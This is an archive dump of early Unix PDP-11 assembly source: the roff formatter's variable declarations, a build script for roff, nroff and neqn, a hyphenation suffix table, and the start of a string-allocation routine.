.byte 120,000,040,006,140,060,000,141,000,026,100,017,040
.byte 140,000,020,007,100,000,000,140,000,001,140,017,020
.byte 110,125,051,162,120,125,127,104,006,104,000,017,052
.byte 140,000,040,000,160,000,000,140,000,000,060,017,000
.byte 040,005,020,000,040,313,231,030,000,140,000,017,056
.byte 140,000,160,000,200,000,000,140,000,000,000,017,240
.byte 065,042,060,040,000,206,231,146,006,224,220,017,004
.byte 240,000,020,000,140,000,000,220,000,000,200,017,141

.even
-- /usr/source/s7/roff8.s mode=0100664 uid=3 gid=3 atime=174924221 mtime=174845736 --
/
/

/ roff5 -- runoff

slow:	1
pto:	9999.
po:	0
ls:	1
ls1:	1
pn:	1
ma1:	2
ma2:	2
ma3:	1
ma4:	3
ll:	65.
llh:	65.
hx:	1
pl:	66.
ad:	1
fi:	1
cc:	'.
ohc:	200
hyf:	1
hypedf:	0
obufp:	obuf
thresh:	240
tabc:	' 
tabtab:
	.byte 8.,16.,24.,32.,40.,48.,56.,64.,72.,0
suffil:
	</usr/lib/suftab\0>
ones:
	<ixcm>
fives:
	<vld>
ttyx:	</dev/tty0\0>
bfn:	</tmp/rtma\0>
	.even
ofile:	-1
nextb:	4
ilistp:	ilist

.bss
old:	.=.+2
stop:	.=.+2
garb:	.=.+2
bname:
nextf: .=.+20.
nx:	.=.+2
ibf:	.=.+2
ibf1:	.=.+2
skp:	.=.+2
ip:	.=.+2
ilist:	.=.+8.
iliste:	.=.+2
column:	.=.+2
ocol:	.=.+2
nspace:	.=.+2
fac:	.=.+2
fmq:	.=.+2
nhl:	.=.+2
nel:	.=.+2
jfomod:	.=.+2
wordp:	.=.+2
nlflg:	.=.+2
/tottext: .=.+2
/totcon: .=.+2
spaceflg: .=.+2
ch:	.=.+2
linep:	.=.+2
undflg:	.=.+2
wordend:	.=.+2
maxdig:	.=.+2
maxloc:	.=.+2
totout:	.=.+2
hstart:	.=.+2
nhstart: .=.+2
nhyph:	.=.+2
argc:	.=.+2
argp:	.=.+2
ibufp:	.=.+2
eibuf:	.=.+2
wne:	.=.+2
nl:	.=.+2
bl:	.=.+2
nc:	.=.+2
ne:	.=.+2
lnumber:	.=.+2
numbmod:	.=.+2
skip:	.=.+2
nwd:	.=.+2
ulstate:	.=.+2
ulc:	.=.+2
bsc:	.=.+2
nsp:	.=.+2
nn:	.=.+2
ro:	.=.+2
pfrom:	.=.+2
ni:	.=.+2
onesp:	.=.+2
fivesp:	.=.+2
ul:	.=.+2
ce:	.=.+2
in:	.=.+2
un:	.=.+2
wch:	.=.+2
suff:	.=.+2
sufb:	.=.+20.
sufbuf:	.=.+512.
suftab:	.=.+[2*26.]
ifile:	.=.+2
char:	.=.+2
nfile:	.=.+2
ehead:	.=.+2
ohead:	.=.+2
efoot:	.=.+2
ofoot:	.=.+2
trtab:	.=.+128.
word:	.=.+200.

stbuf:
linsiz = 500.
line:	.=.+linsiz
end:

-- /usr/source/s7/run mode=0100664 uid=3 gid=3 atime=174924384 mtime=174917292 --
as suftab.s
strip a.out
cmp a.out /usr/lib/suftab
cp a.out /usr/lib/suftab

as roff?.s
ld -s a.out -l
cmp a.out /usr/bin/roff
cp a.out /usr/bin/roff

as nroff[1-5].s roff7.s nroff8.s
ld -s -n a.out
cmp a.out /usr/bin/nroff
cp a.out /usr/bin/nroff

yacc ne.g
cc -s -O -n ne*.c -ly
cmp a.out /usr/bin/neqn
cp a.out /usr/bin/neqn

rm y.tab.c *.o a.out
-- /usr/source/s7/suftab.s mode=0110664 uid=3 gid=3 atime=174924212 mtime=169260923 --
/ suftab - suffix table

suftab:
   sufa+20
   0
   sufc+20
   sufd+20
   sufe+20
   suff+20
   sufg+20
   sufh+20
   sufi+20
   0
   sufk+20
   sufl+20
   sufm+20
   sufn+20
   sufo+20
   sufp+20
   0
   sufr+20
   sufs+20
   suft+20
   0
   0
   0
   0
   sufy+20
   0

sufa:
.byte 2,200+'t	/-TA
.byte 2,200+'s	/-SA
.byte 3,200+'t,'r	/-TRA
.byte 3,200+'d,'r	/-DRA
.byte 3,200+'b,'r	/-BRA
.byte 2,200+'p	/-PA
.byte 2,200+'n	/-NA
.byte 2,200+'m	/-MA
.byte 3,200+'p,'l	/-PLA
.byte 2,200+'l	/-LA
.byte 2,200+'k	/-KA
.byte 3,200+'t,'h	/-THA
.byte 3,200+'s,'h	/-SHA
.byte 2,200+'g	/-GA
.byte 2,200+'d	/-DA
.byte 2,200+'c	/-CA
.byte 2,200+'b	/-BA
.byte 0
sufc:
.byte 4,'e,'t,200+'i	/ET-IC
.byte 7,'a,'l,200+'i,'s,200+'t,'i	/AL-IS-TIC
.byte 4,'s,200+'t,'i	/S-TIC
.byte 4,'p,200+'t,'i	/P-TIC
.byte 5,200+'l,'y,'t,200+'i	/-LYT-IC
.byte 4,'o,'t,200+'i	/OT-IC
.byte 5,'a,'n,200+'t,'i	/AN-TIC
.byte 4,'n,200+'t,'i	/N-TIC
.byte 4,'c,200+'t,'i	/C-TIC
.byte 4,'a,'t,200+'i	/AT-IC
.byte 4,'h,200+'n,'i	/H-NIC
.byte 3,'n,200+'i	/N-IC
.byte 3,'m,200+'i	/M-IC
.byte 4,'l,200+'l,'i	/L-LIC
.byte 4,'b,200+'l,'i	/B-LIC
.byte 4,200+'c,'l,'i	/-CLIC
.byte 3,'l,200+'i	/L-IC
.byte 3,'h,200+'i	/H-IC
.byte 3,'f,200+'i	/F-IC
.byte 3,'d,200+'i	/D-IC
.byte 3,200+'b,'i	/-BIC
.byte 3,'a,200+'i	/A-IC
.byte 3,200+'m,'a	/-MAC
.byte 3,'i,200+'a	/I-AC
.byte 0
sufd:
.byte 4,200+'w,'o,'r	/-WORD
.byte 4,200+'l,'o,'r	/-LORD
.byte 4,200+'f,'o,'r	/-FORD
.byte 4,200+'y,'a,'r	/-YARD
.byte 4,200+'w,'a,'r	/-WARD
.byte 5,200+'g,'u,'a,'r	/-GUARD
.byte 4,200+'t,'a,'r	/-TARD
.byte 5,200+'b,'o,'a,'r	/-BOARD
.byte 4,200+'n,'a,'r	/-NARD
.byte 5,200+'l,'i,'a,'r	/-LIARD
.byte 4,200+'i,'a,'r	/-IARD
.byte 4,200+'g,'a,'r	/-GARD
.byte 4,200+'b,'a,'r	/-BARD
.byte 3,200+'r,'o	/-ROD
.byte 4,200+'w,'o,'o	/-WOOD
.byte 4,200+'h,'o,'o	/-HOOD
.byte 4,200+'m,'o,'n	/-MOND
.byte 4,200+'t,'e,'n	/-TEND
.byte 5,200+'s,'t,'a,'n	/-STAND
.byte 4,200+'l,'a,'n	/-LAND
.byte 4,200+'h,'a,'n	/-HAND
.byte 4,200+'h,'o,'l	/-HOLD
.byte 4,200+'f,'o,'l	/-FOLD
.byte 5,200+'f,'i,'e,'l	/-FIELD
.byte 3,200+'v,'i	/-VID
.byte 3,200+'c,'i	/-CID
.byte 4,200+'s,'a,'i	/-SAID
.byte 4,200+'m,'a,'i	/-MAID
.byte 4,'t,200+'t,'e	/T-TED
.byte 3,'t,200+'e	/T-ED
.byte 4,200+'d,'r,'e	/-DRED
.byte 4,200+'c,'r,'e	/-CRED
.byte 4,200+'b,'r,'e	/-BRED
.byte 5,'v,200+'e,'l,'e	/V-ELED
.byte 100+4,'a,'l,200+'e	/AL/ED
.byte 140+3,200+'e,'e	//EED
.byte 40+5,'e,'d,200+'d,'e	/ED-DED
.byte 4,'d,200+'d,'e	/D-DED
.byte 40+4,'e,'d,200+'e	/ED-ED
.byte 3,'d,200+'e	/D-ED
.byte 5,200+'d,'u,'c,'e	/-DUCED
.byte 300+2,'e	/E/D
.byte 5,200+'s,'t,'e,'a	/-STEAD
.byte 4,200+'h,'e,'a	/-HEAD
.byte 0
sufe:
.byte 5,'a,'r,200+'i,'z	/AR-IZE
.byte 5,'a,'n,200+'i,'z	/AN-IZE
.byte 5,'a,'l,200+'i,'z	/AL-IZE
.byte 6,200+'a,'r,'d,200+'i,'z	/-ARD-IZE
.byte 5,200+'s,'e,'l,'v	/-SELVE
.byte 5,200+'k,'n,'i,'v	/-KNIVE
.byte 5,200+'l,'i,'e,'v	/-LIEVE
.byte 100+3,200+'q,'u	//QUE
.byte 7,'o,'n,200+'t,'i,'n,200+'u	/ON-TIN-UE
.byte 3,200+'n,'u	/-NUE
.byte 3,200+'d,'u	/-DUE
.byte 300+2,'u	/U/E
.byte 300+5,'q,'u,'a,'t	/ QUAT/E
.byte 4,'u,200+'a,'t	/U-ATE
.byte 5,200+'s,'t,'a,'t	/-STATE
.byte 4,200+'t,'a,'t	/-TATE
.byte 6,200+'t,'o,'r,200+'a,'t	/-TOR-ATE
.byte 5,'e,'n,200+'a,'t	/EN-ATE
.byte 4,200+'m,'a,'t	/-MATE
.byte 5,200+'h,'o,'u,'s	/-HOUSE
.byte 5,200+'c,'l,'o,'s	/-CLOSE
.byte 4,'i,200+'o,'s	/I-OSE
.byte 4,200+'w,'i,'s	/-WISE
.byte 5,'a,'s,200+'u,'r	/AS-URE
.byte 40+4,200+'s,'u,'r	/-SURE
.byte 6,200+'f,'i,'g,200+'u,'r	/-FIG-URE
.byte 40+3,200+'t,'r	/-TRE
.byte 5,200+'s,'t,'o,'r	/-STORE
.byte 4,200+'f,'o,'r	/-FORE
.byte 5,200+'w,'h,'e,'r	/-WHERE
.byte 3,200+'d,'r	/-DRE
.byte 3,200+'c,'r	/-CRE
.byte 3,200+'b,'r	/-BRE
.byte 5,200+'s,'c,'o,'p	/-SCOPE
.byte 4,'y,200+'o,'n	/Y-ONE
.byte 5,200+'s,'t,'o,'n	/-STONE
.byte 5,200+'p,'h,'o,'n	/-PHONE
.byte 4,200+'g,'o,'n	/-GONE
.byte 4,'e,200+'o,'n	/E-ONE
.byte 40+4,200+'e,'n,'n	/-ENNE
.byte 40+5,'a,200+'r,'i,'n	/A-RINE
.byte 5,200+'c,'l,'i,'n	/-CLINE
.byte 4,200+'l,'i,'n	/-LINE
.byte 4,200+'s,'o,'m	/-SOME
.byte 4,200+'c,'o,'m	/-COME
.byte 4,200+'t,'i,'m	/-TIME
.byte 3,200+'z,'l	/-ZLE
.byte 3,200+'t,'l	/-TLE
.byte 3,200+'s,'l	/-SLE
.byte 3,200+'p,'l	/-PLE
.byte 5,200+'v,'i,'l,'l	/-VILLE
.byte 4,'c,'k,200+'l	/CK-LE
.byte 3,200+'k,'l	/-KLE
.byte 3,200+'g,'l	/-GLE
.byte 3,200+'f,'l	/-FLE
.byte 3,200+'d,'l	/-DLE
.byte 3,200+'c,'l	/-CLE
.byte 5,200+'p,'a,200+'b,'l	/-PA-BLE
.byte 5,'f,'a,200+'b,'l	/FA-BLE
.byte 5,200+'c,'a,200+'b,'l	/-CA-BLE
.byte 6,200+'s,'t,'a,'b,'l	/-STABLE
.byte 4,200+'a,'b,'l	/-ABLE
.byte 3,200+'b,'l	/-BLE
.byte 4,200+'d,'a,'l	/-DALE
.byte 4,200+'m,'a,'l	/-MALE
.byte 4,200+'s,'a,'l	/-SALE
.byte 4,200+'l,'i,'k	/-LIKE
.byte 340+5,'g,200+'u,'a,'g	/-G/UAGE
.byte 5,200+'r,'i,'a,'g	/-RIAGE
.byte 5,'e,'r,200+'a,'g	/ER-AGE
.byte 4,'m,200+'a,'g	/M-AGE
.byte 4,'k,200+'a,'g	/K-AGE
.byte 4,'d,200+'a,'g	/D-AGE
.byte 4,200+'w,'i,'f	/-WIFE
.byte 5,200+'k,'n,'i,'f	/-KNYFE
.byte 3,200+'s,'e	/-SEE
.byte 4,200+'f,'r,'e	/-FREE
.byte 340+2,'e	/EE
.byte 4,200+'w,'i,'d	/-WIDE
.byte 4,200+'t,'i,'d	/-TIDE
.byte 4,200+'s,'i,'d	/-SIDE
.byte 6,200+'q,'u,'e,'n,'c	/-QUENCE
.byte 7,200+'f,'l,'u,200+'e,'n,'c	/-FLU-ENCE
.byte 40+6,'e,'s,200+'e,'n,'c	/ES-ENCE
.byte 6,'e,'r,200+'e,'n,'c	/ER-ENCE
.byte 5,'i,200+'e,'n,'c	/I-ENCE
.byte 40+5,200+'s,'a,'n,'c	/-SANCE
.byte 6,'e,'r,200+'a,'n,'c	/ER-ANCE
.byte 6,'a,'r,200+'a,'n,'c	/AR-ANCE
.byte 5,200+'n,'a,'n,'c	/-NANCE
.byte 7,200+'b,'a,'l,200+'a,'n,'c	/-BAL-ANCE
.byte 5,'i,200+'a,'n,'c	/I-ANCE
.byte 7,200+'j,'u,'s,200+'t,'i,'c	/-JUS-TICE
.byte 5,200+'s,'t,'i,'c	/-STICE
.byte 5,200+'p,'i,'e,'c	/-PIECE
.byte 5,200+'p,'l,'a,'c	/-PLACE
.byte 340+1	//E
.byte 0
suff:
.byte 5,200+'p,'r,'o,'o	/-PROOF
.byte 4,200+'s,'e,'l	/-SELF
.byte 3,200+'r,'i	/-RIF
.byte 40+4,200+'l,'i,'e	/-LIEF
.byte 0
sufg:
.byte 3,200+'l,'o	/-LOG
.byte 4,200+'l,'o,'n	/-LONG
.byte 5,'t,200+'t,'i,'n	/T-TING
.byte 6,200+'s,'t,'r,'i,'n	/ -STRING
.byte 5,'r,200+'r,'i,'n	/R-RING
.byte 5,'p,200+'p,'i,'n	/P-PING
.byte 5,'n,200+'n,'i,'n	/N-NING
.byte 5,'m,200+'m,'i,'n	/M-MING
.byte 5,'l,200+'l,'i,'n	/ L-LING
.byte 5,200+'z,'l,'i,'n	/-ZLING
.byte 5,200+'t,'l,'i,'n	/-TLING
.byte 40+5,'s,200+'l,'i,'n	/S-LING
.byte 5,'r,200+'l,'i,'n	/R-LING
.byte 5,200+'p,'l,'i,'n	/-PLING
.byte 6,'n,200+'k,'l,'i,'n	/N-KLING
.byte 5,'k,200+'l,'i,'n	/K-LING
.byte 5,200+'g,'l,'i,'n	/-GLING
.byte 5,200+'f,'l,'i,'n	/-FLING
.byte 5,200+'d,'l,'i,'n	/-DLING
.byte 5,200+'c,'l,'i,'n	/-CLING
.byte 5,200+'b,'l,'i,'n	/-BLING
.byte 6,'y,200+'t,'h,'i,'n	/Y-THING
.byte 7,'e,'e,'t,'h,200+'i,'n	/EETH-ING
.byte 6,'e,200+'t,'h,'i,'n	/E-THING
.byte 5,'g,200+'g,'i,'n	/G-GING
.byte 5,'d,200+'d,'i,'n	/D-DING
.byte 5,'b,200+'b,'i,'n	/B-BING
.byte 3,200+'i,'n	/-ING
.byte 0
sufh:
.byte 5,200+'m,'o,'u,'t	/-MOUTH
.byte 5,200+'w,'o,'r,'t	/-WORTH
.byte 4,200+'w,'i,'t	/-WITH
.byte 5,'t,200+'t,'i,'s	/T-TISH
.byte 5,'e,200+'t,'i,'s	/E-TISH
.byte 5,'p,200+'p,'i,'s	/P-PISH
.byte 5,'r,200+'n,'i,'s	/R-NISH
.byte 5,'n,200+'n,'i,'s	/N-NISH
.byte 5,200+'p,'l,'i,'s	/-PLISH
.byte 5,200+'g,'u,'i,'s	/ -GUISH
.byte 5,200+'g,'l,'i,'s	/ -GLISH
.byte 5,'b,200+'l,'i,'s	/ B-LISH
.byte 5,'g,200+'g,'i,'s	/G-GISH
.byte 5,'d,200+'d,'i,'s	/D-DISH
.byte 3,200+'i,'s	/-ISH
.byte 5,200+'g,'r,'a,'p	/-GRAPH
.byte 7,200+'b,'o,'r,200+'o,'u,'g	/-BOR-OUGH
.byte 5,200+'b,'u,'r,'g	/-BURGH
.byte 4,200+'v,'i,'c	/-VICH
.byte 3,200+'n,'a	/-NAH
.byte 3,200+'l,'a	/-LAH
.byte 4,200+'m,'i,200+'a	/-MI-AH
.byte 0
sufi:
.byte 3,200+'t,'r	/-TRI
.byte 3,200+'c,'h	/-CHI
.byte 200+3,'i,'f	/IF-I
.byte 200+3,'e,'d	/ED-I
.byte 5,200+'a,'s,'c,'i	/-ASCII
.byte 0
sufk:
.byte 4,200+'w,'o,'r	/-WORK
.byte 4,200+'m,'a,'r	/-MARK
.byte 4,200+'b,'o,'o	/-BOOK
.byte 4,200+'w,'a,'l	/-WALK
.byte 5,200+'c,'r,'a,'c	/-CRACK
.byte 4,200+'b,'a,'c	/-BACK
.byte 0
sufl:
.byte 3,200+'f,'u	/-FUL
.byte 5,'s,200+'w,'e,'l	/S-WELL
.byte 4,200+'t,'e,'l	/-TELL
.byte 5,200+'s,'h,'e,'l	/-SHELL
.byte 5,200+'s,'t,'a,'l	/-STALL
.byte 4,200+'s,'t,'a	/-STAL
.byte 4,200+'b,'a,'l	/-BALL
.byte 3,'v,200+'e	/V-EL
.byte 3,'u,200+'e	/U-EL
.byte 3,'k,200+'e	/K-EL
.byte 4,'t,'h,200+'e	/TH-EL
.byte 5,'t,'c,'h,200+'e	/TCH-EL
.byte 3,'a,200+'e	/A-EL
.byte 140+4,200+'q,'u,'a	//QUAL
.byte 40+3,'u,200+'a	/U-AL
.byte 3,200+'t,'a	/-TAL
.byte 4,'u,'r,200+'a	/UR-AL
.byte 40+5,'g,200+'o,200+'n,'a	/G-O-NAL
.byte 4,'o,'n,200+'a	/ON-AL
.byte 3,200+'n,'a	/-NAL
.byte 4,200+'t,'i,'a	/-TIAL
.byte 4,200+'s,'i,'a	/-SIAL
.byte 40+5,200+'t,'r,'i,200+'a	/-TRI-AL
.byte 4,'r,'i,200+'a	/RI-AL
.byte 4,200+'n,'i,200+'a	/-NI-AL
.byte 4,200+'d,'i,200+'a	/-DI-AL
.byte 4,200+'c,'i,'a	/-CIAL
.byte 3,200+'g,'a	/-GAL
.byte 4,200+'m,'e,'a	/-MEAL
/.byte 40+4,200+'r,'e,200+'a	/-RE-AL
.byte 40+4,200+'r,'e,'a	/-REAL
.byte 6,'c,200+'t,'i,200+'c,'a	/C-TI-CAL
.byte 5,200+'s,'i,200+'c,'a	/-SI-CAL
.byte 4,200+'i,200+'c,'a	/-I-CAL
.byte 3,200+'c,'a	/-CAL
.byte 3,200+'b,'a	/-BAL
.byte 6,200+'n,'o,200+'m,'i,200+'a	/-NO-MI-AL
.byte 0
sufm:
.byte 3,200+'n,'u	/-NUM
.byte 5,'o,200+'r,'i,200+'u	/O-RI-UM
.byte 40+3,'i,200+'u	/I-UM
.byte 40+3,'e,200+'u	/E-UM
.byte 5,'i,'v,200+'i,'s	/IV-ISM
.byte 4,200+'t,'i,'s	/-TISM
.byte 5,'i,200+'m,'i,'s	/I-MISM
.byte 5,'a,'l,200+'i,'s	/AL-ISM
.byte 40+4,'e,200+'i,'s	/E-ISM
.byte 40+4,'a,200+'i,'s	/A-ISM
.byte 4,200+'r,'o,'o	/-ROOM
.byte 3,200+'d,'o	/-DOM
.byte 3,200+'h,'a	/-HAM
.byte 6,200+'a,200+'r,'i,'t,'h	/-A-RITHM
.byte 5,200+'r,'i,'t,'h	/-RITHM
.byte 0
sufn:
.byte 4,200+'t,'o,'w	/-TOWN
.byte 4,200+'d,'o,'w	/-DOWN
.byte 4,200+'t,'u,'r	/-TURN
.byte 5,200+'s,'p,'o,'o	/-SPOON
.byte 4,200+'n,'o,'o	/-NOON
.byte 4,200+'m,'o,'o	/-MOON
.byte 11,'a,'l,200+'i,200+'z,'a,200+'t,'i,'o	/AL-I-ZA-TION
.byte 7,200+'i,200+'z,'a,200+'t,'i,'o	/-I-ZA-TION
.byte 7,'l,200+'i,200+'a,200+'t,'i,'o	/L-I-A-TION
.byte 4,200+'t,'i,'o	/-TION
.byte 40+5,'s,200+'s,'i,'o	/S-SION
.byte 4,200+'s,'i,'o	/-SION
.byte 4,'n,200+'i,'o	/N-ION
.byte 4,200+'g,'i,'o	/-GION
.byte 4,200+'c,'i,'o	/-CION
.byte 3,200+'c,'o	/-CON
.byte 3,200+'t,'o	/-TON
.byte 3,200+'s,'o	/-SON
.byte 3,200+'r,'i	/-RIN
.byte 3,200+'p,'i	/-PIN
.byte 3,200+'n,'i	/-NIN
.byte 3,200+'m,'i	/-MIN
.byte 3,200+'l,'i	/-LIN
.byte 3,200+'k,'i	/-KIN
.byte 5,200+'s,'t,'e,'i	/-STEIN
.byte 4,200+'t,'a,'i	/-TAIN
.byte 5,'g,'h,'t,200+'e	/GHT-EN
.byte 5,200+'w,'o,'m,200+'e	/-WOM-EN
.byte 3,200+'m,'e	/-MEN
.byte 4,'o,200+'k,'e	/O-KEN
.byte 3,'k,200+'e	/K-EN
.byte 4,200+'t,'e,'e	/-TEEN
.byte 4,200+'s,'e,'e	/-SEEN
.byte 40+3,200+'s,'a	/-SAN
.byte 5,200+'w,'o,'m,200+'a	/-WOM-AN
.byte 3,200+'m,'a	/-MAN
.byte 4,200+'t,'i,'a	/-TIAN
.byte 4,200+'s,'i,'a	/-SIAN
.byte 40+4,'e,200+'i,'a	/E-IAN
.byte 4,200+'c,'i,'a	/-CIAN
.byte 300+3,'i,'a	/IA/N
.byte 5,200+'c,'l,'e,'a	/-CLEAN
.byte 4,200+'m,'e,'a	/-MEAN
.byte 40+3,'e,200+'a	/E-AN
.byte 0
sufo:
.byte 5,200+'m,'a,'c,200+'r	/-MAC-RO
.byte 0
sufp:
.byte 5,200+'g,'r,'o,'u	/-GROUP
.byte 2,200+'u	/-UP
.byte 4,200+'s,'h,'i	/-SHIP
.byte 4,200+'k,'e,'e	/-KEEP
.byte 0
sufr:
.byte 4,200+'z,'a,'r	/-ZARR
.byte 300+2,'r	/R/R
.byte 3,200+'t,'o	/-TOR
.byte 40+3,200+'s,'o	/-SOR
.byte 40+4,200+'r,'i,200+'o	/-RI-OR
.byte 4,'i,'z,200+'e	/IZ-ER
.byte 5,200+'c,'o,'v,200+'e	/-COV-ER
.byte 4,'o,200+'v,'e	/O-VER
.byte 4,200+'e,'v,200+'e	/-EV-ER
.byte 8.,200+'c,'o,'m,200+'p,'u,'t,200+'e	/-COM-PUT-ER
.byte 40+5,'u,'s,200+'t,'e	/US-TER
.byte 5,'o,'s,'t,200+'e	/OST-ER
.byte 40+5,200+'a,'c,200+'t,'e	/-AC-TER
.byte 6,200+'w,'r,'i,'t,200+'e	/-WRIT-ER
.byte 40+5,'i,'s,200+'t,'e	/IS-TER
.byte 40+5,'e,'s,200+'t,'e	/ES-TER
.byte 40+5,'a,'s,200+'t,'e	/AS-TER
.byte 4,200+'s,'t,'e	/-STER
.byte 5,'a,'r,200+'t,'e	/AR-TER
.byte 4,'r,'t,200+'e	/RT-ER
.byte 40+5,'m,200+'e,200+'t,'e	/M-E-TER
.byte 5,200+'w,'a,200+'t,'e	/-WA-TER
.byte 3,'r,200+'e	/R-ER
.byte 4,'o,'p,200+'e	/OP-ER
.byte 5,200+'p,'a,200+'p,'e	/-PA-PER
.byte 4,'w,'n,200+'e	/WN-ER
.byte 40+4,'s,200+'n,'e	/S-NER
.byte 4,'o,'n,200+'e	/ON-ER
.byte 4,'r,'m,200+'e	/RM-ER
.byte 3,200+'m,'e	/-MER
.byte 4,'l,'l,200+'e	/LL-ER
.byte 5,'d,200+'d,'l,'e	/D-DLER
.byte 4,200+'b,'l,'e	/-BLER
.byte 3,'k,200+'e	/K-ER
.byte 5,'n,200+'t,'h,'e	/N-THER
.byte 6,200+'f,'a,200+'t,'h,'e	/-FA-THER
.byte 6,'e,'i,200+'t,'h,'e	/EI-THER
.byte 4,'t,'h,200+'e	/TH-ER
.byte 4,'s,'h,200+'e	/SH-ER
.byte 4,200+'p,'h,'e	/-PHER
.byte 4,'c,'h,200+'e	/CH-ER
.byte 4,'d,'g,200+'e	/DG-ER
.byte 4,'r,'d,200+'e	/RD-ER
.byte 6,'o,'u,'n,'d,200+'e	/OUND-ER
.byte 4,'l,'d,200+'e	/LD-ER
.byte 4,'i,'d,200+'e	/ID-ER
.byte 5,200+'d,'u,'c,200+'e	/-DUC-ER
.byte 4,'n,'c,200+'e	/NC-ER
.byte 100+2, 200+'e	/ /ER
.byte 3,200+'s,'a	/-SAR
.byte 40+6,'a,'c,200+'u,200+'l,'a	/AC-U-LAR
.byte 40+6,'e,'c,200+'u,200+'l,'a	/EC-U-LAR
.byte 40+6,'i,'c,200+'u,200+'l,'a	/IC-U-LAR
.byte 40+6,'e,'g,200+'u,200+'l,'a	/EG-U-LAR
.byte 0
sufs:
.byte 40+4,'u,200+'o,'u	/U-OUS
.byte 5,200+'t,'i,'o,'u	/-TIOUS
.byte 5,200+'g,'i,'o,'u	/-GIOUS
.byte 5,200+'c,'i,'o,'u	/-CIOUS
.byte 40+4,'i,200+'o,'u	/I-OUS
.byte 5,200+'g,'e,'o,'u	/-GEOUS
.byte 5,200+'c,'e,'o,'u	/-CEOUS
.byte 4,'e,200+'o,'u	/E-OUS
.byte 140+2,200+'u	//US
.byte 4,200+'n,'e,'s	/-NESS
.byte 4,200+'l,'e,'s	/-LESS
.byte 140+2,200+'s	//SS
.byte 40+5,'p,200+'o,200+'l,'i	/P-O-LIS
.byte 140+2,200+'i	//IS
.byte 100+3,200+'x,'e	/X/ES
.byte 100+3,200+'s,'e	/S/ES
.byte 100+4,'s,'h,200+'e	/SH/ES
.byte 100+4,'c,'h,200+'e	/CH/ES
.byte 300+1	//S
.byte 0
suft:
.byte 6,'i,'o,'n,200+'i,'s	/ION-IST
.byte 5,'i,'n,200+'i,'s	/IN-IST
.byte 5,'a,'l,200+'i,'s	/AL-IST
.byte 6,'l,200+'o,200+'g,'i,'s	/L-O-GIST
.byte 5,'h,'t,200+'e,'s	/HT-EST
.byte 4,'i,200+'e,'s	/I-EST
.byte 5,'g,200+'g,'e,'s	/G-GEST
.byte 4,'g,200+'e,'s	/G-EST
.byte 5,'d,200+'d,'e,'s	/D-DEST
.byte 4,'d,200+'e,'s	/D-EST
.byte 4,200+'c,'a,'s	/-CAST
.byte 5,200+'h,'e,'a,'r	/-HEART
.byte 4,200+'f,'o,'o	/-FOOT
.byte 3,'i,200+'o	/I-OT
.byte 5,200+'f,'r,'o,'n	/-FRONT
.byte 5,200+'p,'r,'i,'n	/-PRINT
.byte 4,200+'m,'e,'n	/-MENT
.byte 5,200+'c,'i,'e,'n	/-CIENT
.byte 4,'i,200+'a,'n	/I-ANT
.byte 6,200+'w,'r,'i,'g,'h	/-WRIGHT
.byte 6,200+'b,'r,'i,'g,'h	/-BRIGHT
.byte 6,200+'f,'l,'i,'g,'h	/-FLIGHT
.byte 6,200+'w,'e,'i,'g,'h	/-WEIGHT
.byte 5,200+'s,'h,'i,'f	/-SHIFT
.byte 5,200+'c,'r,'a,'f	/-CRAFT
.byte 40+4,'d,'g,200+'e	/DG-ET
.byte 4,200+'g,'o,'a	/-GOAT
.byte 4,200+'c,'o,'a	/-COAT
.byte 4,200+'b,'o,'a	/-BOAT
.byte 4,200+'w,'h,'a	/-WHAT
.byte 4,200+'c,'u,'i	/-CUIT
.byte 0
sufy:
.byte 40+4,'e,'s,200+'t	/ES-TY
.byte 40+5,'q,'u,'i,200+'t	/QUI-TY
.byte 4,200+'t,'i,200+'t	/-TI-TY
.byte 40+5,'o,'s,200+'i,200+'t	/OS-I-TY
.byte 4,200+'s,'i,200+'t	/-SI-TY
.byte 5,'i,'n,200+'i,200+'t	/IN-I-TY
.byte 4,'n,'i,200+'t	/NI-TY
.byte 40+10,'f,'a,200+'b,'i,'l,200+'i,200+'t	/FA-BIL-I-TY
.byte 10,200+'c,'a,200+'b,'i,'l,200+'i,200+'t	/-CA-BIL-I-TY
.byte 10,200+'p,'a,200+'b,'i,'l,200+'i,200+'t	/-PA-BIL-I-TY
.byte 6,200+'b,'i,'l,200+'i,200+'t	/-BIL-I-TY
.byte 3,'i,200+'t	/I-TY
.byte 4,200+'b,'u,'r	/-BUR-Y
.byte 4,200+'t,'o,200+'r	/-TO-RY
.byte 5,200+'q,'u,'a,'r	/-QUAR-Y
.byte 40+4,'u,200+'a,'r	/U-ARY
.byte 7,200+'m,'e,'n,200+'t,'a,200+'r	/-MEN-TA-RY
.byte 6,'i,'o,'n,200+'a,'r	/ION-ARY
.byte 4,'i,200+'a,'r	/I-ARY
.byte 4,'n,200+'o,200+'m	/N-O-MY
.byte 3,200+'p,'l	/-PLY
.byte 4,'g,200+'g,'l	/G-GLY
.byte 5,200+'p,'a,200+'b,'l	/-PA-BLY
.byte 5,'f,'a,200+'b,'l	/FA-BLY
.byte 5,200+'c,'a,200+'b,'l	/-CA-BLY
.byte 4,200+'a,'b,'l	/-ABLY
.byte 3,200+'b,'l	/-BLY
.byte 2,200+'l	/-LY
.byte 3,200+'s,'k	/-SKY
.byte 40+6,'g,200+'r,'a,200+'p,'h	/G-RA-PHY
.byte 4,'l,200+'o,200+'g	/L-O-GY
.byte 2,200+'f	/-FY
.byte 3,200+'n,'e	/-NEY
.byte 3,200+'l,'e	/-LEY
.byte 4,'c,'k,200+'e	/CK-EY
.byte 3,200+'k,'e	/-KEY
.byte 4,200+'b,'o,'d	/-BODY
.byte 5,200+'s,'t,'u,'d	/-STUDY
.byte 340+4,'e,'e,'d	/EEDY
.byte 2,200+'b	/-BY
.byte 3,200+'w,'a	/-WAY
.byte 3,200+'d,'a	/-DAY
.byte 0
.even
-- /usr/source/salloc mode=0140775 uid=3 gid=3 atime=174930100 mtime=174924409 --
-- /usr/source/salloc/alloc1.s mode=0100664 uid=3 gid=3 atime=174924387 mtime=169260932 --
.globl	plausible
.globl	lookchar
.globl	wc
.globl	seekchar
.globl	putchar
.globl	allocate
.globl	release
.globl	stats
.globl	w,r,a,l
.globl	bufchar
.globl	copy
.globl	getbuf
.globl	swap
.globl fixct
/
/	routine to copy the contents of one string
/	to another.
/
/	mov	source,r0
/	mov	dest,r1
/	jsr	pc,copy
/	mov	r1,...
/
/	on return, r1 points to the new string and should
/	be saved.  r0 is preserved.
/
copy:
	mov	r0,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	jsr	pc,wc
1:	jsr	pc,reset
	mov	w(r0),r2
	sub	a(r0),r2	/W-A
	mov	l(r1),r3
	sub	a(r1),r3	/L-A
